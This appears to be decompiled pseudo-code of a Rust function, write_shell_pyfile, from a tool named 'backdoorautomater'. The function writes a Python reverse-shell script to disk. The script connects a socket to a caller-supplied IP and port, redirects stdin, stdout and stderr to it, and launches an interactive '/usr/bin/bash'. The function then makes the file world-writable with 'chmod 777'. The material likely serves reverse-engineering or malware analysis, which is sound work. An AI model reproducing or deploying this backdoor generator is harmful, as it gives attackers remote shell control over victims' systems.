
  fn backdoorautomater::shellscript::write_shell_pyfile::h0bdea7fe03ab2920(arg1: *mut i64, arg2: *mut i64, arg3: *mut i64) -> *mut *mut [i8; 0x94]

{
    let mut var_130: i32;
    std::fs::File::create::he97042899d0016f9(&var_130, arg3);
    let mut result: *mut *mut [i8; 0x94];
    
    if var_130 == 0
    {
        let fd_1: i32;
        let mut fd: i32 = fd_1;
        let result_2: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
            "import socket,subprocess,os;\ns=…", 0x1d);
        result = result_2;
        
        if result_2 != 0
        {
            goto 'label_45f49f;
        }
        
        let result_3: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
            "s=socket.socket(socket.AF_INET,s…", 0x34);
        result = result_3;
        
        if result_3 != 0
        {
            goto 'label_45f49f;
        }
        
        var_130 = "v_ip='os.dup2(s.fileno(),0);\nos…";
        let var_128: i64 = 6;
        let var_120_1: i128 = *arg2.byte_offset(8);
        let mut var_1a8: i128;
        alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a8, &var_130, 2, 1, 0);
        let mut var_1e8: i128 = var_1a8;
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_1e8, 
            "';\nimport socket,subprocess,os;…", 3);
        let var_198: u64;
        let result_4: *mut *mut [i8; 0x94] =
            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_1e8[8], var_198);
        result = result_4;
        
        if result_4 != 0
        {
            goto 'label_45f496;
        }
        
        var_130 = "s.connect((v_ip,src/cronshell.rs…";
        let var_128_1: i64 = 0x10;
        let var_120_2: i128 = *arg1.byte_offset(8);
        alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a8, &var_130, 2, 1, 0);
        let mut var_1c8: i128 = var_1a8;
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_1c8, 
            "));\n$i='kindNoneSomeZeroIpv4Ipv…", 4);
        let result_5: *mut *mut [i8; 0x94] =
            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_1c8[8], var_198);
        result = result_5;
        
        if result_5 != 0
        {
            'label_45f48c:
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1c8);
            'label_45f496:
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1e8);
            'label_45f49f:
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
        }
        else
        {
            let result_6: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "os.dup2(s.fileno(),0);\nos.dup2(…", 0x17);
            result = result_6;
            
            if result_6 != 0
            {
                goto 'label_45f48c;
            }
            
            let result_7: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "os.dup2(s.fileno(),1);\nos.dup2(…", 0x17);
            result = result_7;
            
            if result_7 != 0
            {
                goto 'label_45f48c;
            }
            
            let result_8: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "os.dup2(s.fileno(),2);\nv_shell_…", 0x17);
            result = result_8;
            
            if result_8 != 0
            {
                goto 'label_45f48c;
            }
            
            let result_9: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "v_shell_path='/usr/bin/bash';\nv…", 0x1e);
            result = result_9;
            
            if result_9 != 0
            {
                goto 'label_45f48c;
            }
            
            let result_10: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "v_shell_value='-i';\np=subproces…", 0x14);
            result = result_10;
            
            if result_10 != 0
            {
                goto 'label_45f48c;
            }
            
            let result_11: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "p=subprocess.call([v_shell_path,…", 0x31);
            result = result_11;
            
            if result_11 != 0
            {
                goto 'label_45f48c;
            }
            
            let zmm0_5: i64 = *arg3.byte_offset(8);
            var_130 = "chmod 777 sh-cFailed to execute …";
            let var_128_2: i64 = 0xa;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a8, &var_130, 2, 1, 0);
            let zmm0_6: i128 = var_1a8;
            std::process::Command::new::hc59b10cf3f1b2ada(&var_130, 
                "sh-cFailed to execute commandsrc…");
            let mut rbp: i64;
            rbp = 1;
            let rax_6: *mut i64 = std::process::Command::arg::ha1bca970e684ecbe(&var_130, 
                "-cFailed to execute commandsrc/s…");
            let var_198_1: u64 = var_198;
            var_1a8 = zmm0_6;
            std::process::Command::arg::hc1c88ee68029addc(rax_6, &var_1a8);
            std::process::Command::output::hf2f7777b705db8a9(&var_1a8);
            let mut var_60: ();
            core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_60, &var_1a8);
            core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_130);
            let var_40: i64;
            let var_38: size_t;
            alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_1a8, var_40, var_38);
            let mut rax_7: i64;
            let mut rdx_6: u64;
            rax_7 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_1a8);
            _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                &var_130, rax_7, rdx_6);
            let var_138_1: i64 = zmm0_5;
            let mut var_148: i128 = var_130;
            core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(
                &var_1a8);
            backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_148);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_148);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_60);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1c8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1e8);
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
            result = nullptr;
        }
    }
    else
    {
        let result_1: *mut *mut [i8; 0x94];
        result = result_1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    result
}
